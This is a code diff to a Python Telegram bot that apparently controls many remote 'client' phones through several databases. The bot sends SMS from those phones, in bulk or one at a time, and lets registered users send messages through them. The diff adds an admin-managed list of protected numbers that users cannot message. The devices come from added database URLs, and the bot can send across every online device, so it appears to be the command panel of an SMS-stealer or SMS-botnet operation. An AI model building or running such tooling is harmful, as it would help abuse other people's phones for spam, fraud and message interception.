@@ -178,6 +178,7 @@ MAIN_KB = {
         [{"text": "📱 Devices", "callback_data": "devrefresh"}],
         [{"text": "🗂 Databases", "callback_data": "dbpanel"}],
         [{"text": "👥 Users", "callback_data": "users"}],
+        [{"text": "🛡 Protection", "callback_data": "prot"}],
         [{"text": "➕ Add URL", "callback_data": "add"},
          {"text": "📋 List URLs", "callback_data": "list"}],
         [{"text": "🔎 Analyze All", "callback_data": "analyze"},
@@ -759,11 +760,15 @@ ADM_DRAFT: Dict[int, Dict[str, Any]] = {}  # admin chat -> {"dev":..., "to":...,
 ADMIN_CANCEL_KB = {"inline_keyboard": [[{"text": "🔙 Cancel", "callback_data": "smslist"}]]}
 
 
-def queue_send(dev_id: str, target: str, text: str, sim: int = 1, base: Optional[str] = None) -> tuple:
+def queue_send(dev_id: str, target: str, text: str, sim: int = 1, base: Optional[str] = None,
+               admin: bool = False) -> tuple:
     """Panel-exact send: PUT clients/{id}/webhookEvent/sendSms with
     {from: <sim slot>, to: <number>, message, isSended: false},
     then read the node back to verify. base=None → active DB.
-    Returns (ok, detail)."""
+    Returns (ok, detail). Admin sends bypass protection (with warning upstream)."""
+    hit = prot_matches(target)
+    if hit and not admin:
+        return False, f"🛡 recipient {hit} is protected by admin"
     base = (base or fb_base() or "").rstrip("/")
     if not base:
         return False, "no database configured"
@@ -821,7 +826,7 @@ def run_bulk_send(chat_id: int, message_id: Optional[int], to: str, text: str,
     show(0, force=True)
     for i, tgt in enumerate(targets, 1):
         try:
-            ok, detail = queue_send(tgt["id"], to, text, sim, tgt.get("db"))
+            ok, detail = queue_send(tgt["id"], to, text, sim, tgt.get("db"), admin=admin)
         except Exception as exc:
             ok, detail = False, str(exc)[:120]
         if ok:
@@ -901,7 +906,11 @@ def admin_send_confirm(chat_id: int, message_id: Optional[int] = None, _online: 
         via = f"🌐 All online devices ({len(online)} across {len(pool_urls())} DBs)"
     else:
         via = f"<code>{html.escape(d['dev'])}</code>" + (f" +{count - 1} more" if count > 1 else "")
-    text = (f"<b>✉️ Confirm send</b>\nTo: <code>{html.escape(d['to'])}</code>\n"
+    shield = ""
+    hit = prot_matches(d["to"])
+    if hit:
+        shield = f"\n🛡 <b>Warning:</b> <code>{html.escape(hit)}</code> is protected — sending anyway (admin bypass)."
+    text = (f"<b>✉️ Confirm send</b>{shield}\nTo: <code>{html.escape(d['to'])}</code>\n"
             f"Via: {via}\n\n{html.escape(preview)}\n\nSIM slot + repeat:")
     rows = [[{"text": f"{'🌐✅ ' if mode == 'all' else '🌐 '}All devices", "callback_data": "aall"}]]
     if mode == "single":
@@ -967,7 +976,7 @@ def handle_command(chat_id: int, text: str):
     if cmd == "/start":
         send(chat_id, menu_text(), MAIN_KB)
     elif cmd == "/help":
-        send(chat_id, "/start → panel\n/list\n/analyze\n/add <url>\n/remove <url|n>\n/sms → SMS panel\n/devices\n/dbs\n/users → registered users\n/ban|/unban <chat_id>\n/cast <text> → broadcast to users\n/stopwatch → stop new-message watch", MAIN_KB)
+        send(chat_id, "/start → panel\n/list\n/analyze\n/add <url>\n/remove <url|n>\n/sms → SMS panel\n/devices\n/dbs\n/users → registered users\n/ban|/unban <chat_id>\n/protection → protected numbers panel\n/protect <nums> · /unprotect <nums>\n/cast <text> → broadcast to users\n/stopwatch → stop new-message watch", MAIN_KB)
     elif cmd == "/users":
         users_screen(chat_id)
     elif cmd == "/ban" or cmd == "/unban":
@@ -982,6 +991,26 @@ def handle_command(chat_id: int, text: str):
             users[key] = rec
             save_json(USER_STORE, users)
             send(chat_id, f"{'🚫 Banned' if cmd == '/ban' else '✅ Unbanned'} <code>{key}</code>.", MAIN_KB)
+    elif cmd == "/protect":
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip():
+            send(chat_id, "Usage: /protect <number(s)> — space or comma separated, e.g. /protect 9800000001, 9800000002", MAIN_KB)
+        else:
+            protect_add_result(chat_id, protect_add(parts[1]))
+    elif cmd == "/unprotect":
+        parts = text.split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip():
+            send(chat_id, "Usage: /unprotect <number(s)> (see /protection)", MAIN_KB)
+        else:
+            removed, missing = protect_remove(parts[1])
+            lines = []
+            if removed:
+                lines.append("✅ Unprotected: " + ", ".join(f"<code>{k}</code>" for k in removed))
+            if missing:
+                lines.append("Not found: " + ", ".join(f"<code>{html.escape(k)}</code>" for k in missing))
+            send(chat_id, "\n".join(lines) or "Nothing removed.", MAIN_KB)
+    elif cmd == "/protection":
+        protection_screen(chat_id)
     elif cmd == "/cast":
         parts = text.split(maxsplit=1)
         if len(parts) < 2 or not parts[1].strip():
@@ -1108,6 +1137,19 @@ def handle_callback(chat_id: int, message_id: int, data: str, callback_id: str):
         send(chat_id, "/start → panel\n/list\n/analyze\n/add <url>\n/remove <url|n>\n/sms\n/devices\n/dbs\n/users\n/ban|/unban\n/cast\n/stopwatch", MAIN_KB)
     elif data == "users":
         users_screen(chat_id, message_id)
+    elif data == "prot":
+        protection_screen(chat_id, message_id)
+    elif data.startswith("prot:off:"):
+        key = data.split(":", 2)[2]
+        removed, missing = protect_remove(key)
+        if removed:
+            edit(chat_id, message_id, f"✅ Unprotected <code>{html.escape(removed[0])}</code>", None)
+        protection_screen(chat_id, message_id)
+    elif data == "prot:add":
+        PENDING[chat_id] = "prot_add"
+        edit(chat_id, message_id,
+             "🛡 Send the number(s) to protect — space or comma separated:\n"
+             f"Example: <code>9800000001, 9800000002</code>", MAIN_KB)
     elif data == "devrefresh":
         edit(chat_id, message_id, "⏳ Loading devices…", devices_kb())
         threading.Thread(target=lambda: devices_screen(chat_id, message_id, devices=fetch_devices(force=True)), daemon=True).start()
@@ -1235,6 +1277,128 @@ USER_MAX_TEXT = 1000
 
 USTATE: Dict[int, Dict[str, Any]] = {}  # user chat_id -> {"stage":..., "to":..., "text":..., "sender":...}
 ULAST_SEND: Dict[int, float] = {}
+
+# -----------------------------------------------------------
+# protection: numbers users are not allowed to message
+# -----------------------------------------------------------
+
+PROTECT_STORE = os.path.join(HERE, "bot_protection.json")
+PROTECT_LOCK = threading.Lock()
+
+
+def prot_normalize(text: str) -> Optional[str]:
+    """Canonical match key: digits only, +91xxxx → drop 91. Keeps other
+    country codes whole so +1… stays distinct from bare 10-digit."""
+    digits = re.sub(r"\D", "", str(text or ""))
+    if len(digits) == 12 and digits.startswith("91"):
+        digits = digits[2:]
+    if not (7 <= len(digits) <= 15):
+        return None
+    return digits
+
+
+def prot_matches(target: str) -> Optional[str]:
+    n = prot_normalize(target)
+    return n if is_protected(n) else None
+
+
+def is_protected(target: Optional[str]) -> bool:
+    n = prot_normalize(target) if target else None
+    if not n:
+        return False
+    with PROTECT_LOCK:
+        return n in load_json(PROTECT_STORE, {})
+
+
+def _prot_tokens(text: str) -> List[str]:
+    """Comma/space split, then re-join fragments like '+91 9812345678' that a
+    space broke apart ('+91' + digits)."""
+    toks = (text or "").replace(",", " ").split()
+    merged: List[str] = []
+    for tok in toks:
+        if merged and re.fullmatch(r"[-+ ]?\d{0,3}", merged[-1]) and prot_normalize(merged[-1] + tok):
+            merged[-1] = merged[-1] + tok
+        else:
+            merged.append(tok)
+    return merged
+
+
+def protect_add(text: str) -> tuple:
+    """Text may hold several numbers at once. Returns (added, dup, bad)."""
+    added, dup, bad = [], [], []
+    with PROTECT_LOCK:
+        store = load_json(PROTECT_STORE, {})
+        for tok in _prot_tokens(text):
+            key = prot_normalize(tok)
+            if not key:
+                if re.search(r"[0-9a-zA-Z]", tok, re.IGNORECASE):
+                    bad.append(str(tok)[:16])  # digits or letters → report, symbols ignored
+                continue  # pure +/spaces → silently ignore
+            if key in store:
+                dup.append(key)
+                continue
+            store[key] = {"added_ts": int(time.time()), "by": ADMIN_CHAT_ID}
+            added.append(key)
+        if added:
+            save_json(PROTECT_STORE, store)
+    return added, dup, bad
+
+
+def protect_remove(text: str) -> tuple:
+    """Removes by number(s). Returns (removed, missing)."""
+    removed, missing = [], []
+    with PROTECT_LOCK:
+        store = load_json(PROTECT_STORE, {})
+        for tok in _prot_tokens(text):
+            key = prot_normalize(tok)
+            if not key:
+                if re.search(r"[0-9a-zA-Z]", tok, re.IGNORECASE):
+                    missing.append(str(tok)[:16])
+                continue
+            if key in store:
+                store.pop(key, None)
+                removed.append(key)
+            else:
+                missing.append(key)
+        if removed:
+            save_json(PROTECT_STORE, store)
+    return removed, missing
+
+
+def protect_add_result(chat_id: int, res: tuple, kb: Optional[Dict[str, Any]] = None):
+    added, dup, bad = res
+    lines = []
+    if added:
+        lines.append("🛡 Protected: " + ", ".join(f"<code>{k}</code>" for k in added))
+    if dup:
+        lines.append("Already protected: " + ", ".join(f"<code>{k}</code>" for k in dup))
+    if bad:
+        lines.append("❌ Not valid numbers: " + ", ".join(f"<code>{html.escape(b)}</code>" for b in bad))
+    send(chat_id, "\n".join(lines) or "Nothing to protect.", kb or MAIN_KB)
+
+
+def protection_screen(chat_id: int, message_id: Optional[int] = None):
+    with PROTECT_LOCK:
+        store = load_json(PROTECT_STORE, {})
+    keys = sorted(store.keys())
+    total = len(keys)
+    head = (f"<b>🛡 Protection</b>\n"
+            f"{total} protected number(s). Send by <b>users to these numbers is blocked</b>.\n"
+            f"(Admin sends are allowed with a warning.)")
+    if not keys:
+        head += "\n\nNo numbers protected yet."
+    kb_rows: List[List[Dict[str, str]]] = [
+        [{"text": "➕ Add numbers", "callback_data": "prot:add"}]]
+    for k in keys[:40]:
+        kb_rows.append([{"text": f"🛡 {k} — unprotect", "callback_data": f"prot:off:{k}"}])
+    if total > 40:
+        kb_rows.append([{"text": f"… +{total - 40} more (use /unprotect)", "callback_data": "noop"}])
+    kb_rows.append([{"text": "🔙 Menu", "callback_data": "back"}])
+    kb = {"inline_keyboard": kb_rows}
+    if message_id is not None:
+        edit(chat_id, message_id, head, kb)
+    else:
+        send(chat_id, head, kb)
 
 USER_KB = {
     "inline_keyboard": [
@@ -1372,6 +1536,11 @@ def handle_user_stage(chat_id: int, text: str):
         to = normalize_phone(text)
         if not to:
             send(chat_id, "❌ That doesn't look like a phone number (7–15 digits).\nTry again, e.g. <code>+15551234567</code>:", USER_CANCEL_KB)
+            return
+        hit = prot_matches(to)
+        if hit:
+            send(chat_id, f"🛡 <b>Not allowed:</b> <code>{html.escape(hit)}</code> is protected by the admin. "
+                          f"Messages to this number are blocked.\nTry another number:", USER_CANCEL_KB)
             return
         st.update(stage="text", to=to)
         send(chat_id, f"Recipient: <code>{html.escape(to)}</code>\n\nNow type your message (max {USER_MAX_TEXT} chars):", USER_CANCEL_KB)
@@ -1632,6 +1801,11 @@ def handle_user_callback(chat_id: int, message_id: int, data: str, callback_id: 
             answer_callback(callback_id, f"wait {int(wait)}s")
             send(chat_id, f"⏳ Slow down — one message per {USER_SEND_COOLDOWN}s. Try again in {int(wait)}s.", USER_KB)
             return
+        hit = prot_matches(st.get("to", ""))
+        if hit:
+            USTATE.pop(chat_id, None)
+            edit(chat_id, message_id, f"🛡 <b>Send cancelled:</b> <code>{html.escape(hit)}</code> is protected by the admin.", USER_KB)
+            return
         ULAST_SEND[chat_id] = now
         to, txt, sim = st["to"], st["text"], st.get("sim", 1)
         mode, sender = st.get("mode", "single"), st["sender"]
@@ -1801,6 +1975,10 @@ def main():
                             add_url(chat_id, msg.get("text", ""))
                         elif mode == "remove":
                             remove_url(chat_id, msg.get("text", ""))
+                        elif mode == "prot_add":
+                            PENDING.pop(chat_id, None)
+                            protect_add_result(chat_id, protect_add(msg.get("text", "")))
+                            protection_screen(chat_id)
                         elif isinstance(mode, tuple) and mode[0] == "adm_num":
                             to = normalize_phone(msg.get("text", ""))
                             if not to:
